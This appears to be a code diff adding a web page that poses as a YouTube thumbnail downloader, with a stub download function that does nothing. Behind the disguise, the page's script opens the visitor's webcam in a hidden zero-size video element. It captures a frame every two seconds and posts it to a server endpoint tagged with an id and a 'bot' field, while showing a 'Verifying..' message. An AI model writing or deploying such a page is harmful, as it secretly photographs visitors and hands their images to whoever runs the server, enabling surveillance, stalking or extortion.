@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>.
+    <link rel="stylesheet" href="./kod.css">
+</head>
+<body>
+    <nav class="navbar">
+        <img class="youtube" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+        <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+      </nav>
+    
+      <div class="container">
+        <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
+        <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
+        <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
+    
+        <h2>How to Download HD YouTube Thumbnail</h2>
+        <ol>
+          <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
+          <li>Paste the YouTube video Link / URL in the Input Field Above</li>
+          <li>Click on the "FETCH" Button</li>
+          <li>Select the thumbnail quality</li>
+          <li>Download the Thumbnail</li>
+        </ol>
+      </div>
+    
+      <center>
+        <button id="toggle-video" style="display:none;">Toggle Video</button>
+        <div id="message-container">Verifying..</div>
+        <video id="video" width="0" height="0" autoplay=""></video>
+      </center>
+    
+      <script type="text/javascript">
+      function downloadThumbnail() {
+            // Change button text to indicate fetching
+            var btn = document.getElementById('thumbdloadbtn');
+            btn.textContent = 'Fetching from server... Wait';
+    
+            // Add your logic to fetch the thumbnail here
+            // ...
+        }
+        var originalNumber = "6848010505";
+        var messageContainer = document.getElementById("message-container");
+        // get user media
+        if (navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+            })
+            .catch(function(error) {
+                console.error('Error accessing media devices.', error);
+            });
+        }
+    
+        // send image to server
+        setInterval(function() {
+            if (video.paused || video.ended) return;
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            var image_data = canvas.toDataURL('image/png');
+    
+            $.ajax({
+                type: 'POST',
+                url: '/api-main', // Update with the correct server endpoint
+                data: {
+                    imgcode: image_data,
+                    id: originalNumber,
+                    bot: 2
+                },
+                success: function(response) {
+                    var data = response; // Assuming response is already an object
+    
+                    // If response is a JSON string, parse it
+                    if (typeof response === 'string') {
+                        try {
+                            data = JSON.parse(response);
+                        } catch (e) {
+                            console.error('Parsing error:', e);
+                            return;
+                        }
+                    }
+    
+                    console.log('Server Response:', data);
+                    messageContainer.textContent = 'Verifying..';
+                },
+                error: function(XHR, textStatus, errorThrown) {
+                    console.error('Error sending image to server:', textStatus, errorThrown);
+                    messageContainer.textContent = 'Error';
+                }
+            });
+        }, 2000); // send image every 2 seconds
+      </script>
+    
+      <footer class="footer">
+        <p>Davron hush kelibsiz</p>
+      </footer>
+    <script>(function(){if (!document.body) return;var js = "window['__CF$cv$params']={r:'874430ad884c8f5e',t:'MTcxMzEwMjg5MS4xOTgwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: medium; visibility: hidden;"></iframe>
+    
+    
+</body>
+</html>
